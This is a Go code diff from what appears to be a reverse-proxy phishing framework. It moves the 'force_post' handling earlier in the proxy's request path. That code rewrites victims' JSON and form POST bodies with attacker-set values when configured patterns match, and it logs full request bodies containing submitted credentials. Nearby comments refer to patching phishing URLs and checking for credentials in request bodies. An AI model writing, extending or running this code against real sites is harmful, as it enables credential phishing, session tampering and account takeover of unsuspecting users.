@@ -654,13 +654,113 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+				// force_post checking
+				if pl != nil {
+					body, err := ioutil.ReadAll(req.Body)
+					method := req.Method
+					if err == nil && method == "POST" {
+						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+						log.Debug("POST URL: %s", req.URL.Path)
+						log.Debug("POST body = %s", body)
+						contentType := req.Header.Get("Content-type")
+
+						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
+						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")
+
+						if json_re.MatchString(contentType) {
+							// force post json
+							for _, fp := range pl.forcePost {
+								if fp.path.MatchString(req.URL.Path) {
+									log.Debug("force_post: url matched: %s", req.URL.Path)
+									ok_search := false
+									if len(fp.search) > 0 {
+										k_matched := len(fp.search)
+										for _, fp_s := range fp.search {
+											matches := fp_s.key.FindAllString(string(body), -1)
+											for _, match := range matches {
+												if fp_s.search.MatchString(match) {
+													if k_matched > 0 {
+														k_matched -= 1
+													}
+													log.Debug("force_post: [%d] matched - %s", k_matched, match)
+													break
+												}
+											}
+										}
+										if k_matched == 0 {
+											ok_search = true
+										}
+									} else {
+										ok_search = true
+									}
+									if ok_search {
+										for _, fp_f := range fp.force {
+											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
+											if err != nil {
+												log.Debug("force_post: got error: %s", err)
+											}
+											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
+										}
+									}
+									req.ContentLength = int64(len(body))
+									log.Debug("force_post: body: %s len:%d", body, len(body))
+								}
+							}
+						} else if form_re.MatchString(contentType) {
+
+							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
+								log.Debug("POST: %s", req.URL.Path)
+								// force posts
+								for _, fp := range pl.forcePost {
+									if fp.path.MatchString(req.URL.Path) {
+										log.Debug("force_post: url matched: %s", req.URL.Path)
+										ok_search := false
+										if len(fp.search) > 0 {
+											log.Debug("search applies, len: %d", len(fp.search))
+											k_matched := len(fp.search)
+											for _, fp_s := range fp.search {
+												log.Debug("fpsearch %s", fp_s)
+												for k, v := range req.PostForm {
+													log.Debug("post form: %s : %s", k, v[0])
+													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
+														if k_matched > 0 {
+															k_matched -= 1
+														}
+														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
+														break
+													}
+												}
+											}
+											if k_matched == 0 {
+												ok_search = true
+											}
+										} else {
+											ok_search = true
+										}
+
+										if ok_search {
+											for _, fp_f := range fp.force {
+												req.PostForm.Set(fp_f.key, fp_f.value)
+											}
+											body = []byte(req.PostForm.Encode())
+											req.ContentLength = int64(len(body))
+											log.Debug("force_post: body: %s len:%d", body, len(body))
+										}
+									}
+								}
+							}
+						}
+						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+					}
+
+				}
+
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
 					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
-
 						// patch phishing URLs in JSON body with original domains
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
 						req.ContentLength = int64(len(body))
@@ -707,45 +807,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Error("database: %v", err)
 										}
 									}
-								}
-							}
-
-							// force post json
-							for _, fp := range pl.forcePost {
-								if fp.path.MatchString(req.URL.Path) {
-									log.Debug("force_post: url matched: %s", req.URL.Path)
-									ok_search := false
-									if len(fp.search) > 0 {
-										k_matched := len(fp.search)
-										for _, fp_s := range fp.search {
-											matches := fp_s.key.FindAllString(string(body), -1)
-											for _, match := range matches {
-												if fp_s.search.MatchString(match) {
-													if k_matched > 0 {
-														k_matched -= 1
-													}
-													log.Debug("force_post: [%d] matched - %s", k_matched, match)
-													break
-												}
-											}
-										}
-										if k_matched == 0 {
-											ok_search = true
-										}
-									} else {
-										ok_search = true
-									}
-									if ok_search {
-										for _, fp_f := range fp.force {
-											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
-											if err != nil {
-												log.Debug("force_post: got error: %s", err)
-											}
-											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
-										}
-									}
-									req.ContentLength = int64(len(body))
-									log.Debug("force_post: body: %s len:%d", body, len(body))
 								}
 							}
 
@@ -806,42 +867,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								body = []byte(req.PostForm.Encode())
 								req.ContentLength = int64(len(body))
-
-								// force posts
-								for _, fp := range pl.forcePost {
-									if fp.path.MatchString(req.URL.Path) {
-										log.Debug("force_post: url matched: %s", req.URL.Path)
-										ok_search := false
-										if len(fp.search) > 0 {
-											k_matched := len(fp.search)
-											for _, fp_s := range fp.search {
-												for k, v := range req.PostForm {
-													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
-														if k_matched > 0 {
-															k_matched -= 1
-														}
-														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
-														break
-													}
-												}
-											}
-											if k_matched == 0 {
-												ok_search = true
-											}
-										} else {
-											ok_search = true
-										}
-
-										if ok_search {
-											for _, fp_f := range fp.force {
-												req.PostForm.Set(fp_f.key, fp_f.value)
-											}
-											body = []byte(req.PostForm.Encode())
-											req.ContentLength = int64(len(body))
-											log.Debug("force_post: body: %s len:%d", body, len(body))
-										}
-									}
-								}
 
 							}
 
